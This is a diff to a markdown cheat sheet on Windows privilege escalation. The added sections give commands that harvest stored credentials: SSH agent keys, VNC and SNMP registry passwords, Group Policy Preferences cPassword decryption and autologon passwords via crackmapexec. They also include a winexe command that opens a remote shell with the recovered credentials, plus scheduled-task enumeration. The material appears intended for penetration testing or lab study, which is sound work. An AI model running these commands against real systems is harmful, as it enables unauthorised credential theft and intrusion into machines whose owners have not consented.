@@ -1,3 +1,18 @@
+#### Strategy
+```
+- stored creds
+- kernel exploits
+- DLL injection and hijacking
+- insecure file/folder permissions
+- insecure service permissions
+- group policy preferences
+- unquoted service path
+- always install elevated
+- token manipulation
+- autologon user creds
+- schedule tasks
+```
+
 #### Creating an account
 ```
 - net user name Username12345678* /add /Y
@@ -25,6 +40,11 @@
   - search for vulns in all installed software
 - sc start
 - sc stop
+- Restart service:
+  - wmic service NAMEOFSERVICE call startservice
+  - net stop [service name] && net start [service name]
+- SSH keys
+  - reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
 
 #### Network Enum
@@ -92,6 +112,39 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+#### Cached GPP Password
+```
+- Decrypt cPassword:
+  - gpp-decrypt <cpasswordtext>
+- crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
+```
+
+#### Registry keys
+```
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
+reg query "HKCU\Software\TightVNC\Server"
+reg query "HKCU\Software\OpenSSH\Agent\Key"
+```
+
+#### Auto logon
+```
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon
+
+If enabled: use creds to get schell
+winexe -U 'admin%password123' //10.10.10.10 cmd.exe
+```
+
+#### Scheduled tasks
+```
+schtasks /query /fo LIST 2>nul | findstr TaskName
+dir C:\windows\tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
 #### Sites:
